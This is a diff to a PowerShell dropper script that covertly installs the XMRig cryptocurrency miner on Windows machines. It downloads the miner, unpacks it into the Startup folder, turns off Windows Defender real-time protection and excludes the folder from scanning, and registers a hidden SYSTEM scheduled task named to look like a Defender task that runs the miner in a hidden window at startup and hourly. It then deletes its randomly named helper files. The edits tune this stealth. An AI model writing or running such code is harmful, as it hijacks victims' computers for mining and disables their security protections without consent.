@@ -71,7 +71,7 @@ New-Item -ItemType Directory -Name "$wd" -Path "$path"
 cd $wd
 Set-Variable -Name currentDir -Value ($Pwd)
 
-Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/xmrig-6.22.2-msvc-win64.zip"
+Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
 
 # Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
 
@@ -120,11 +120,11 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # Define hidden payload path
 $hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 #$payloadName = "svchost.exe"
-$destinationPath = "$hiddenDir\NetFramwork\w.bat"#Join-Path $hiddenDir $payloadName
+$destinationPath = "$hiddenDir\xmrig-6.22.2\w.bat"#Join-Path $hiddenDir $payloadName
 #$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
 
-mkdir "$hiddenDir\NetFramwork"
-Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$hiddenDir\NetFramwork"
+# mkdir "$hiddenDir\xmrig-6.22.2"
+Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$hiddenDir"
 
 # Create hidden directory
 if (-not (Test-Path $hiddenDir)) {
@@ -135,7 +135,7 @@ if (-not (Test-Path $hiddenDir)) {
 # Copy miner to hidden location
 #Copy-Item -Path $newConfigPath_2 -Destination $destinationPath -Force
 Set-Variable -Name newConfigPath -Value ("$path\w.bat")
-Set-Variable -Value ("$hiddenDir\NetFramwork\w.bat") -Name targetConfigPath
+Set-Variable -Value ("$hiddenDir\xmrig-6.22.2\w.bat") -Name targetConfigPath
 if (Test-Path -Path $newConfigPath) {
     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
     Write-Output "bat file has been copied successfully."
@@ -143,8 +143,9 @@ if (Test-Path -Path $newConfigPath) {
     Write-Output "New bat file not found at the specified path."
 }
 
-# Rename-Item -Path "$hiddenDir\NetFramwork\xmrig.exe" -NewName "NetFramwork.exe"
-
+Remove-Item -Path "$hiddenDir\xmrig-6.22.2\config.json"
+# Rename-Item -Path "$hiddenDir\xmrig-6.22.2\xmrig.exe" -NewName "xmrig-6.22.2.exe"
+Start-Sleep -Seconds 45
 # Disable Windows Defender temporarily
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction SilentlyContinue
@@ -169,12 +170,13 @@ catch {
 # 2. Create SYSTEM-level Scheduled Task
 $taskName = "WinDefendTask_$((Get-Date).Ticks)"
 try {
-    $action = New-ScheduledTaskAction -Execute $destinationPath -Argument "--donate-level=1"
+    # Added -WindowStyle Hidden to prevent console window popup
+    $action = New-ScheduledTaskAction -Execute $destinationPath -Argument "--donate-level=1" -WindowStyle Hidden
     $trigger1 = New-ScheduledTaskTrigger -AtStartup
     $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 60)
     
     $settings = New-ScheduledTaskSettingsSet `
-        -Hidden `
+        -Hidden `  # This hides the task in Task Scheduler UI
         -DontStopIfGoingOnBatteries `
         -StartWhenAvailable `
         -MultipleInstances Ignore
@@ -264,4 +266,4 @@ Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
 Remove-Item -Path "$path\w.bat"
-# Remove-Item -Path "$hiddenDir\NetFramwork\xmrig.exe"
+# Remove-Item -Path "$hiddenDir\xmrig-6.22.2\xmrig.exe"
